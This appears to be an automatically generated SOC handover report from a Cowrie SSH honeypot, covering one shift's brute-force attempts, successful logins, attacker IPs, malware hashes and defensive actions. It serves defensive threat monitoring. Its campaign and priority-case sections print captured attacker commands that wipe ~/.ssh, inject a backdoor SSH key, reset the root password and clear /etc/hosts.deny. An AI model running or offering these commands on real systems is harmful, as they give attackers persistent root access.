# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T16:53:25Z |
| **Shift Time** | 16:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **33** |
| False Positives Filtered | **13** (28.3%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **14** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **43** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **20** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `Root` | 2 |
| `centos` | 2 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `123qwe` | 2 |
| `password321` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `Root` | `password321` | 1 |
| `nobody` | `nobody2005` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ZAQ12WSX` | `190.213.180.98` | 2026-03-27T15:29:11 |
| `root` | `p0o9i8u7y6t5` | `103.215.80.173` | 2026-03-27T16:05:51 |
| `root` | `3245gs5662d34` | `103.215.80.173` | 2026-03-27T16:05:55 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:UjQAY9JsnLCN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `190.213.180.98`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.215.80.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **28** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS3301` | Telia Company AB | 2 | HIGH |
| `AS55933` | Cloudie Limited | 1 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-94a7160e90e4

| Field | Detail |
|---|---|
| **Source IP** | `190.213.180[.]98` |
| **First Seen** | 2026-03-27 15:29 |
| **Last Seen** | 2026-03-27 15:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UjQAY9JsnLCN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 15:29:09` | `cowrie.session.connect` |
| `2026-03-27 15:29:09` | `cowrie.client.version` |
| `2026-03-27 15:29:10` | `cowrie.client.kex` |
| `2026-03-27 15:29:11` | `cowrie.login.success` |
| `2026-03-27 15:29:12` | `cowrie.session.params` |
| `2026-03-27 15:29:12` | `cowrie.command.input` |
| `2026-03-27 15:29:12` | `cowrie.command.failed` |
| `2026-03-27 15:29:12` | `cowrie.log.closed` |
| `2026-03-27 15:29:13` | `cowrie.session.params` |
| `2026-03-27 15:29:13` | `cowrie.command.input` |
| `2026-03-27 15:29:13` | `cowrie.session.file_download` |
| `2026-03-27 15:29:13` | `cowrie.log.closed` |
| `2026-03-27 15:29:14` | `cowrie.session.params` |
| `2026-03-27 15:29:14` | `cowrie.command.input` |
| `2026-03-27 15:29:14` | `cowrie.log.closed` |
| `2026-03-27 15:29:15` | `cowrie.session.params` |
| `2026-03-27 15:29:15` | `cowrie.command.input` |
| `2026-03-27 15:29:15` | `cowrie.log.closed` |
| `2026-03-27 15:29:16` | `cowrie.session.params` |
| `2026-03-27 15:29:16` | `cowrie.command.input` |
| `2026-03-27 15:29:16` | `cowrie.session.file_download` |
| `2026-03-27 15:29:16` | `cowrie.log.closed` |
| `2026-03-27 15:29:17` | `cowrie.session.params` |
| `2026-03-27 15:29:17` | `cowrie.command.input` |
| `2026-03-27 15:29:17` | `cowrie.log.closed` |
| `2026-03-27 15:29:18` | `cowrie.session.params` |
| `2026-03-27 15:29:18` | `cowrie.command.input` |
| `2026-03-27 15:29:18` | `cowrie.log.closed` |
| `2026-03-27 15:29:19` | `cowrie.session.params` |
| `2026-03-27 15:29:19` | `cowrie.command.input` |
| `2026-03-27 15:29:19` | `cowrie.command.input` |
| `2026-03-27 15:29:19` | `cowrie.log.closed` |
| `2026-03-27 15:29:19` | `cowrie.session.params` |
| `2026-03-27 15:29:19` | `cowrie.command.input` |
| `2026-03-27 15:29:20` | `cowrie.log.closed` |
| `2026-03-27 15:29:20` | `cowrie.session.params` |
| `2026-03-27 15:29:20` | `cowrie.command.input` |
| `2026-03-27 15:29:21` | `cowrie.log.closed` |
| `2026-03-27 15:29:21` | `cowrie.session.params` |
| `2026-03-27 15:29:21` | `cowrie.command.input` |
| `2026-03-27 15:29:21` | `cowrie.log.closed` |
| `2026-03-27 15:29:22` | `cowrie.session.params` |
| `2026-03-27 15:29:22` | `cowrie.command.input` |
| `2026-03-27 15:29:22` | `cowrie.log.closed` |
| `2026-03-27 15:29:23` | `cowrie.session.params` |
| `2026-03-27 15:29:23` | `cowrie.command.input` |
| `2026-03-27 15:29:23` | `cowrie.log.closed` |
| `2026-03-27 15:29:24` | `cowrie.session.params` |
| `2026-03-27 15:29:24` | `cowrie.command.input` |
| `2026-03-27 15:29:24` | `cowrie.log.closed` |
| `2026-03-27 15:29:25` | `cowrie.session.params` |
| `2026-03-27 15:29:25` | `cowrie.command.input` |
| `2026-03-27 15:29:25` | `cowrie.log.closed` |
| `2026-03-27 15:29:26` | `cowrie.session.params` |
| `2026-03-27 15:29:26` | `cowrie.command.input` |
| `2026-03-27 15:29:26` | `cowrie.log.closed` |
| `2026-03-27 15:29:26` | `cowrie.session.params` |
| `2026-03-27 15:29:26` | `cowrie.command.input` |
| `2026-03-27 15:29:27` | `cowrie.log.closed` |
| `2026-03-27 15:29:27` | `cowrie.session.params` |
| `2026-03-27 15:29:27` | `cowrie.command.input` |
| `2026-03-27 15:29:28` | `cowrie.log.closed` |
| `2026-03-27 15:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.213.180[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.213.180[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b77f8341fa4c

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-03-27 16:05 |
| **Last Seen** | 2026-03-27 16:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 16:05:50` | `cowrie.session.connect` |
| `2026-03-27 16:05:50` | `cowrie.client.version` |
| `2026-03-27 16:05:50` | `cowrie.client.kex` |
| `2026-03-27 16:05:51` | `cowrie.login.success` |
| `2026-03-27 16:05:51` | `cowrie.session.params` |
| `2026-03-27 16:05:51` | `cowrie.command.input` |
| `2026-03-27 16:05:51` | `cowrie.command.failed` |
| `2026-03-27 16:05:51` | `cowrie.log.closed` |
| `2026-03-27 16:05:51` | `cowrie.session.params` |
| `2026-03-27 16:05:51` | `cowrie.command.input` |
| `2026-03-27 16:05:51` | `cowrie.session.file_download` |
| `2026-03-27 16:05:51` | `cowrie.log.closed` |
| `2026-03-27 16:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5287122e1edc

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-03-27 16:05 |
| **Last Seen** | 2026-03-27 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 16:05:54` | `cowrie.session.connect` |
| `2026-03-27 16:05:54` | `cowrie.client.version` |
| `2026-03-27 16:05:54` | `cowrie.client.kex` |
| `2026-03-27 16:05:55` | `cowrie.login.success` |
| `2026-03-27 16:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `3.131.220[.]121` | **7** | 2026-03-27 15:10 | 2026-03-27 15:19 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `103.215.80[.]173` | 1 | 2026-03-27 16:05 | 2026-03-27 16:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.250.160[.]76` | 1 | 2026-03-27 16:31 | 2026-03-27 16:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.9[.]235` | 1 | 2026-03-27 14:49 | 2026-03-27 14:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.5.76[.]239` | 1 | 2026-03-27 16:12 | 2026-03-27 16:12 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.80.146[.]195` | 1 | 2026-03-27 15:35 | 2026-03-27 15:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.3[.]158` | 1 | 2026-03-27 16:44 | 2026-03-27 16:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | 1 | 2026-03-27 16:24 | 2026-03-27 16:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]254` | 1 | 2026-03-27 16:21 | 2026-03-27 16:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]97` | 1 | 2026-03-27 15:38 | 2026-03-27 15:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.90[.]30` | 1 | 2026-03-27 15:44 | 2026-03-27 15:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.243.208[.]127` | 1 | 2026-03-27 16:31 | 2026-03-27 16:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-03-27 16:50 | 2026-03-27 16:50 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.59.178[.]14` | 1 | 2026-03-27 16:33 | 2026-03-27 16:33 | 8s | 0 | `T1592` | 🟢 LOW |
| `217.149.191[.]246` | 1 | 2026-03-27 14:59 | 2026-03-27 14:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.107.72[.]234` | 1 | 2026-03-27 15:12 | 2026-03-27 15:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.104.225[.]201` | 1 | 2026-03-27 16:30 | 2026-03-27 16:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.243.68[.]66` | 1 | 2026-03-27 14:52 | 2026-03-27 14:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.132[.]6` | 1 | 2026-03-27 15:52 | 2026-03-27 15:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.187[.]47` | 1 | 2026-03-27 16:13 | 2026-03-27 16:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]44` | 1 | 2026-03-27 16:07 | 2026-03-27 16:07 | 16s | 0 | `T1592` | 🟢 LOW |
| `68.7.114[.]69` | 1 | 2026-03-27 15:33 | 2026-03-27 15:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.149.30[.]186` | 1 | 2026-03-27 14:53 | 2026-03-27 14:53 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.168[.]26` | 1 | 2026-03-27 15:10 | 2026-03-27 15:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.195[.]44` | US | Censys, Inc. | **100** ⚠️ | 6 |
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 11 |
| `162.243.208[.]127` | US | DigitalOcean, LLC | **100** ⚠️ | 23 |
| `24.104.225[.]201` | US | Charter Communications Inc | **100** ⚠️ | 46 |
| `111.70.9[.]235` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 24 |
| `120.196.66[.]80` | CN | China Mobile Communications Corporation | **100** ⚠️ | 15 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `90.230.168[.]26` | SE | Telia Network Services | **100** ⚠️ | 33 |
| `35.243.68[.]66` | JP | Google LLC | **100** ⚠️ | 35 |
| `49.124.132[.]6` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 31 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 28 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (28.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 24 recon entry/entries in table (1 group(s) consolidating 7 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T16:53:25Z_
